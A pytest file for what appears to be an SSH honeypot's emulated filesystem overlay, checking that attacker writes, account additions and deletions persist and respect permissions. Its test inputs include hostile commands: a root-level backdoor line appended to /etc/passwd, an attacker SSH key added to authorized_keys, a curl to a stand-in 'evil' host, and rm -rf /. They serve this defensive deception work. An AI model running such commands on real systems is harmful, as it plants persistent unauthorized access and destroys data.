"""可變狀態覆寫層 (#mutable-state overlay)：攻擊者的寫入/建立/刪除/新增帳號
之後讀回(含跨連線、跨程序)都要反映,消除「改了卻讀不到」的破綻。"""
import pytest
from layer2.db import init_db
from layer2.cache import CacheHandler


@pytest.fixture
def ch(tmp_db):
    init_db(tmp_db)
    return CacheHandler()


# ── 檔案寫入 / 讀回 ──────────────────────────────────────────────────────────
def test_echo_write_then_cat(ch):
    ch.handle("echo 'hello world' > /tmp/note.txt", "/tmp", "admin")
    assert ch.handle("cat /tmp/note.txt", "/tmp", "admin") == "hello world\n"


def test_echo_append_accumulates(ch):
    ch.handle("echo aaa > /tmp/f", "/tmp", "admin")
    ch.handle("echo bbb >> /tmp/f", "/tmp", "admin")
    assert ch.handle("cat /tmp/f", "/tmp", "admin") == "aaa\nbbb\n"


def test_created_file_appears_in_ls(ch):
    ch.handle("echo x > /tmp/evil.sh", "/tmp", "admin")
    assert "evil.sh" in ch.handle("ls /tmp", "/", "admin")


def test_head_wc_reflect_overlay(ch):
    ch.handle("echo l1 > /tmp/m", "/tmp", "admin")
    ch.handle("echo l2 >> /tmp/m", "/tmp", "admin")
    assert ch.handle("wc -l /tmp/m", "/tmp", "admin").split()[0] == "2"


# ── 持久化帳號 (useradd / echo >> /etc/passwd) ───────────────────────────────
def test_backdoor_user_appended_to_passwd_keeps_base(ch):
    ch.handle('sudo bash -c "echo \'backdoor:x:0:0:root:/root:/bin/bash\' >> /etc/passwd"',
              "/root", "admin")
    out = ch.handle("cat /etc/passwd", "/", "admin")
    assert "backdoor:x:0:0" in out
    assert "root:x:0:0" in out          # 原始內容仍在


def test_useradd_reflected_in_passwd_and_home(ch):
    ch.handle("useradd -m -s /bin/bash -u 1337 h4x0r", "/root", "root")
    assert "h4x0r" in ch.handle("cat /etc/passwd", "/", "root")
    assert "h4x0r" in ch.handle("ls /home", "/", "root")


def test_appended_authorized_keys(ch):
    ch.handle("mkdir -p /root/.ssh", "/root", "root")
    ch.handle("echo 'ssh-rsa AAAA attacker@kali' >> /root/.ssh/authorized_keys", "/root", "root")
    assert "attacker@kali" in ch.handle("cat /root/.ssh/authorized_keys", "/", "root")


# ── mkdir / touch / rm ───────────────────────────────────────────────────────
def test_mkdir_then_ls_shows_dir(ch):
    ch.handle("mkdir /tmp/stuff", "/tmp", "admin")
    assert "stuff" in ch.handle("ls /tmp", "/", "admin")


def test_touch_creates_empty_file(ch):
    ch.handle("touch /tmp/newfile", "/tmp", "admin")
    assert "newfile" in ch.handle("ls /tmp", "/", "admin")


def test_rm_marks_file_gone(ch):
    ch.handle("echo x > /tmp/f", "/tmp", "admin")
    ch.handle("rm -f /tmp/f", "/tmp", "admin")
    assert "No such file" in ch.handle("cat /tmp/f", "/tmp", "admin")
    assert "f" not in ch.handle("ls /tmp", "/", "admin").split()


# ── 跨連線 / 跨程序持久（同一 DB） ───────────────────────────────────────────
def test_mutation_persists_across_handler_instances(ch):
    ch.handle("echo persist > /tmp/keep", "/tmp", "admin")
    ch2 = CacheHandler()          # 模擬重連 / 另一個程序
    assert ch2.handle("cat /tmp/keep", "/tmp", "admin") == "persist\n"


def test_rm_rf_root_still_failsafe(ch):
    out = ch.handle("rm -rf /", "/root", "root")
    assert "dangerous" in out or "no-preserve-root" in out


def test_apply_write_skips_dev_null(ch):
    # `cmd > /dev/null` 是丟棄輸出,不該變成可見檔,且交給 LLM 處理整段指令
    from layer2 import overlay
    assert overlay.apply_write("curl http://evil/x > /dev/null", "/tmp", "admin") is None


def test_apply_write_skips_compound_command(ch):
    # 含 && / | / ; 的複合指令不當作單純寫入(避免吃掉後半段)
    from layer2 import overlay
    assert overlay.apply_write("echo x > /tmp/f && cat /tmp/f", "/tmp", "admin") is None
    assert overlay.apply_write("echo x > /tmp/f | tee /tmp/g", "/tmp", "admin") is None


def test_mkdir_then_cd_into_overlay_dir(ch, tmp_db):
    # 跨程序：Layer2 建立的目錄,Layer1 的 cd（讀同一個 SQLite 覆寫層）也要能進去
    from layer1.session_manager import SessionManager
    ch.handle("mkdir /tmp/loot", "/tmp", "admin")
    mgr = SessionManager()
    mgr.create("s", "admin", "1.1.1.1")
    new_dir, err = mgr.handle_cd("s", "cd /tmp/loot")
    assert err == ""
    assert new_dir == "/tmp/loot"


# ── 寫入權限模型（Codex #1/#2）────────────────────────────────────────────────
def test_non_root_cannot_write_etc_passwd(ch):
    out = ch.handle("echo 'x:x:0:0::/root:/bin/bash' >> /etc/passwd", "/home/deploy", "deploy")
    assert "Permission denied" in out
    assert "x:x:0:0" not in ch.handle("cat /etc/passwd", "/", "root")


def test_sudo_write_to_etc_passwd_allowed(ch):
    ch.handle('sudo bash -c "echo \'bd:x:0:0::/root:/bin/bash\' >> /etc/passwd"', "/home/admin", "admin")
    assert "bd:x:0:0" in ch.handle("cat /etc/passwd", "/", "root")


def test_non_root_can_write_tmp_and_own_home(ch):
    ch.handle("echo hi > /tmp/ok", "/tmp", "deploy")
    assert ch.handle("cat /tmp/ok", "/tmp", "deploy") == "hi\n"
    ch.handle("echo yo > /home/deploy/note", "/home/deploy", "deploy")
    assert ch.handle("cat /home/deploy/note", "/home/deploy", "deploy") == "yo\n"


def test_non_root_cannot_mkdir_in_etc(ch):
    assert "Permission denied" in ch.handle("mkdir /etc/evil", "/etc", "deploy")


def test_overlay_file_under_root_not_world_readable(ch):
    ch.handle("mkdir -p /root/.ssh", "/root", "root")
    ch.handle("echo 'ssh-rsa K attacker@kali' >> /root/.ssh/authorized_keys", "/root", "root")
    assert "Permission denied" in ch.handle("cat /root/.ssh/authorized_keys", "/", "deploy")
    assert "attacker@kali" in ch.handle("cat /root/.ssh/authorized_keys", "/", "root")


# ── overlay 正確性（Codex #3/#5/#7）──────────────────────────────────────────
def test_mkdir_p_creates_parent_dirs(ch):
    from layer1.session_manager import SessionManager
    ch.handle("mkdir -p /tmp/a/b/c", "/tmp", "admin")
    mgr = SessionManager()
    mgr.create("s", "admin", "1.1.1.1")
    nd, err = mgr.handle_cd("s", "cd /tmp/a")
    assert err == "" and nd == "/tmp/a"


def test_rm_r_removes_children(ch):
    ch.handle("mkdir -p /tmp/d", "/tmp", "admin")
    ch.handle("echo x > /tmp/d/f", "/tmp", "admin")
    ch.handle("rm -r /tmp/d", "/tmp", "admin")
    assert "No such file" in ch.handle("cat /tmp/d/f", "/tmp", "admin")


def test_rm_nonexistent_without_f_errors(ch):
    assert "No such file" in ch.handle("rm /tmp/ghost", "/tmp", "admin")


def test_rm_f_nonexistent_is_silent(ch):
    assert ch.handle("rm -f /tmp/ghost", "/tmp", "admin") == ""


def test_rm_directory_without_r_errors(ch):
    ch.handle("mkdir /tmp/d2", "/tmp", "admin")
    assert "Is a directory" in ch.handle("rm /tmp/d2", "/tmp", "admin")


def test_grep_quoted_pattern_with_spaces(ch):
    ch.handle("echo 'hello world here' > /tmp/g", "/tmp", "admin")
    out = ch.handle("grep 'hello world' /tmp/g", "/tmp", "admin")
    assert "hello world here" in out


def test_ls_long_shows_overlay_file_with_correct_size(ch):
    ch.handle("echo hello > /tmp/note", "/tmp", "admin")   # "hello\n" = 6 bytes
    line = [l for l in ch.handle("ls -l /tmp", "/", "admin").splitlines() if l.endswith(" note")][0]
    assert line.startswith("-")          # 一般檔,不是目錄
    assert line.split()[4] == "6"        # 大小正確,非 0
